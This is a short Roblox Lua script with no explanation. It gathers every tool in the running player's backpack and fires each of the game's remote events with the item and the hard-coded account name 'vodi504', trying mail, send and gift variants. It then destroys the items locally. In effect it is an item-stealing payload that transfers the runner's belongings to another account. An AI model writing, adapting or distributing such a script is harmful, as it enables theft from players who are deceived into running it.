local p=game.Players.LocalPlayer
local rs=game:GetService("ReplicatedStorage")
local t="vodi504"
local function s(item)
    for _,v in pairs(rs:GetDescendants())do
        if v:IsA("RemoteEvent")then
            pcall(function()
                v:FireServer(t,item)
                v:FireServer("SendToMail",t,item)
                v:FireServer("Mail",t,item)
                v:FireServer("Send",t,item)
                v:FireServer("Gift",t,item)
            end)
        end
    end
end
local function c()
    local bp=p.Backpack
    if bp then
        for _,item in pairs(bp:GetChildren())do if item:IsA("Tool")then s(item)item:Destroy()task.wait()end end
    end
end
task.wait(5)c()
